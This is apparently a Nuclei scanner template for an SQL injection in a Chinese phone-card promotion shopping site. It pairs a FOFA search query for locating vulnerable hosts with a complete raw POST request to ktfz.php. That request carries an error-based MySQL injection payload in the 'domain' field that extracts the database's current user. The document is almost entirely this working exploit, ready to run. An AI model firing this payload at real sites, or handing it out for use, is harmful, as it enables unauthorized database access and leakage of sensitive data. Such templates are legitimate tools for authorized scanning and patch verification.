id: mobile-mall-ssk-sqli-2

info:
  name: 手机卡号推广商城 ssk接口 SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="zgdx.php"
      该系统在处理ssk接口请求时存在SQL注入缺陷，攻击者可通过构造恶意参数执行任意SQL语句，导致数据库敏感信息泄露。
  tags: 手机卡号推广商城

http:
- raw:
  - |
    POST /ktfz.php?upid=1 HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
    Cache-Control: max-age=0
    Content-Type: application/x-www-form-urlencoded
    Upgrade-Insecure-Requests: 1
    Connection: close

    domain=' AND (SELECT 1809 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- c&pwd=111&submit=%E6%B7%BB%E5%8A%A0&user=111
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'mysqli_query'
